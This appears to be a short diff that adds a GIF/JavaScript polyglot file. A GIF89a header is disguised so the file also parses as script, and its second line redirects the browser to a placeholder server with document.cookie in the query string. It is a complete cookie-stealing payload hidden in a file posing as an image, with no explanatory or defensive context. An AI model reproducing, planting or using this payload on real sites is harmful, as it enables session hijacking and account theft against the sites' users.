@@ -1,0 +1,2 @@
+GIF89a/*.......*/=0;
+window.location='http://SERVER-IP?c='+document.cookie;
